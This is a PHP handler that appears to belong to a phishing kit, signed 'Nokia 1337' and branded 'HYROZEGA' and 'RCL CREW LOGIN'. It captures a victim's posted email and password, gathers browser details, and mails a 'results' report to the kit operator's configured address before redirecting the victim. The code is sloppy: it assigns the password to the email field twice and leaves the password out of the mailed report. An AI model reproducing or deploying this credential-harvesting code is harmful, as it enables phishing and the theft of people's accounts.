<?php
require_once("../main.php");
/**
 * @Author: Nokia 1337
 * @Date:   2019-11-13 15:09:19
 * @Last Modified by:   Nokia 1337
 * @Last Modified time: 2019-11-14 21:06:07
*/
if(!empty($_POST['email']) && !empty($_POST['password'])){ 
 
    
	
	$_SESSION['account']['email'] 	= $_POST['password'];
	$_SESSION['account']['email'] 	= $_POST['password'];
	$_SESSION['page']['login'] 			= true;

	foreach ($_SESSION['users_browsers'] as $key => $value) {
		$users_browsers .= "    ".$key." : ".$value."\r\n";
	}

	$data = "
	++--------[ EMAIL ACCESS ]--------++

	------------------------------------------
	          HYROZEGA
	------------------------------------------

	Email : ".$_POST['email']." 
	

	------------------------------------------
	          USERS INFO
	------------------------------------------
	".$users_browsers."

	++---------===[ $$ End Resutls $$ ]===---------++
	";

	$headers 	= "From: HYROZEGA <".$_POST['email']."@hyrozega.com>";
	mail($config['email'], "[EMAIL] RCL CREW LOGIN  : ".$_POST['email'] , $data ,$headers);

    header("Location: /", true, 301);
exit();


    
    
    
    
}

?>
